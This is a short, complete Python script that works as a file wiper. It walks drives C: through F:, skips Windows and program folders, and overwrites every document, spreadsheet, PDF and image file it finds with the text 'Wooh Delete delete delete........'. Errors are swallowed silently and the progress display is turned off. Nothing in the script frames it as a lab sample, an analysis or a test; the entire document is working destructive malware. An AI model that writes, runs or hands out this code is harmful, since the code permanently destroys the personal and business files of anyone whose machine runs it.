import os
from tqdm import tqdm

EXTENSIONS = ['.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.jpeg', '.png', '.bmp']
TARGET_FOLDERS = ['C:\\', 'D:\\', 'E:\\', 'F:\\'] 
MESSAGE = b"Wooh Delete delete delete........"

def overwrite_file(file_path):
    try:
        with open(file_path, 'wb') as f:
            f.write(MESSAGE)
        return True
    except:
        return False

def get_all_target_files(folder):
    target_files = []
    for root, dirs, files in os.walk(folder, topdown=True):
        dirs[:] = [d for d in dirs if not d.lower() in (
            'windows', 'program files', 'program files (x86)',
            'appdata', 'programdata', '$recycle.bin', 'system volume information'
        )]
        for file in files:
            filepath = os.path.join(root, file)
            if any(filepath.lower().endswith(ext) for ext in EXTENSIONS):
                target_files.append(filepath)
    return target_files

if __name__ == "__main__":
    for folder in TARGET_FOLDERS:
        if os.path.exists(folder):
            files_to_process = get_all_target_files(folder)
            for file_path in tqdm(files_to_process, disable=True):
                overwrite_file(file_path)
        else:
            pass
